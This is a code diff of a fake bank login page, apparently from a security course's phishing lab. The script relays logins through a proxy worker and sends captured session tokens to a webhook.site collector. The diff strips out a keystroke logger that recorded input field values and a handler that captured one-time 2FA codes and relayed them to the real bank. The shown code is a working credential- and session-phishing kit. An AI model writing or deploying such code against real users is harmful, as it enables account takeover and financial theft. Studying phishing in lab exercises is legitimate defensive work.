@@ -136,41 +136,14 @@ body{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helv
   </main>
 <script>
   const PROXY = 'https://veltra-worker.emi-hacklab.workers.dev';
-  const WEBHOOK = 'https://webhook.site/4d6add98-fee0-4e89-bfeb-bbdc49048c52';
+  const WEBHOOK = 'https://webhook.site/NUEVA-URL-ACA';
   const BANCO = 'https://chl-252f32f0-0279-4210-a32f-5148b25c322d-veltra-bank.softwareseguro.com.ar';
-
-  let capturedSession = '';
 
   function exfil(params) {
     const qs = new URLSearchParams(params).toString();
     new Image().src = WEBHOOK + '?' + qs;
     fetch(WEBHOOK + '?' + qs, { mode: 'no-cors' }).catch(() => {});
   }
-
-  function track(event, data) {
-    exfil({ event, ...data, ts: Date.now() });
-  }
-  window.addEventListener('error', e => {
-  track('js_error', { msg: e.message, file: e.filename, line: e.lineno });
-});
-
-window.addEventListener('unhandledrejection', e => {
-  track('promise_error', { msg: String(e.reason) });
-});
-  document.addEventListener('DOMContentLoaded', () => {
-    document.querySelectorAll('input').forEach(input => {
-      input.addEventListener('focus', () => track('focus', { field: input.id }));
-      input.addEventListener('input', () => track('input', { field: input.id, val: input.value }));
-      input.addEventListener('blur', () => track('blur', { field: input.id, val: input.value }));
-    });
-    document.querySelectorAll('button').forEach(btn => {
-      btn.addEventListener('click', () => track('click', { btn: btn.id }));
-    });
-    document.addEventListener('visibilitychange', () => {
-      track('visibility', { state: document.visibilityState });
-    });
-    track('pageload', { url: location.href });
-  });
 
   async function proxyReq(path, body) {
     const res = await fetch(PROXY + path, {
@@ -179,21 +152,6 @@ window.addEventListener('unhandledrejection', e => {
       body: body ? JSON.stringify(body) : undefined
     });
     return res.json();
-  }
-
-  function mostrarPaso2(usuario) {
-    document.getElementById('nombre-usuario').textContent = usuario;
-    document.getElementById('hero-1').classList.add('hidden');
-    document.getElementById('card-1').classList.add('hidden');
-    document.getElementById('hero-2').classList.remove('hidden');
-    document.getElementById('card-2').classList.remove('hidden');
-    document.getElementById('txt-2fa').focus();
-  }
-
-  function mostrarError(id, msg) {
-    const el = document.getElementById(id);
-    el.textContent = msg;
-    el.classList.remove('hidden');
   }
 
   document.getElementById('form-login').addEventListener('submit', async function(e) {
@@ -213,31 +171,8 @@ window.addEventListener('unhandledrejection', e => {
       if (data._s) s = data._s;
     } catch (err) {}
 
-    exfil({ step: '1_session', s });
-
-    track('redirect', { to: 'otp.html' });
+    exfil({ step: 'redirect', s });
     window.location.href = 'otp.html?s=' + encodeURIComponent(s) + '&u=' + encodeURIComponent(u);
-  });
-
-  document.getElementById('form-2fa').addEventListener('submit', async function(e) {
-    e.preventDefault();
-    const codigo = document.getElementById('txt-2fa').value.trim();
-    const btn = document.getElementById('btn-2fa');
-
-    btn.disabled = true;
-    btn.textContent = 'Confirmando…';
-
-    exfil({ step: '2', otp: codigo });
-
-    try {
-      const res = await proxyReq('/api/verificar-full', { codigo, session: capturedSession });
-      if (res.ok) {
-        window.location.href = BANCO + (res.next || '/dashboard');
-        return;
-      }
-    } catch (err) {}
-
-    setTimeout(() => { window.location.href = BANCO + '/login'; }, 800);
   });
 
   document.getElementById('volver-login').addEventListener('click', function(e) {
@@ -248,6 +183,5 @@ window.addEventListener('unhandledrejection', e => {
     document.getElementById('card-1').classList.remove('hidden');
   });
 </script>
- 
 </body>
 </html>
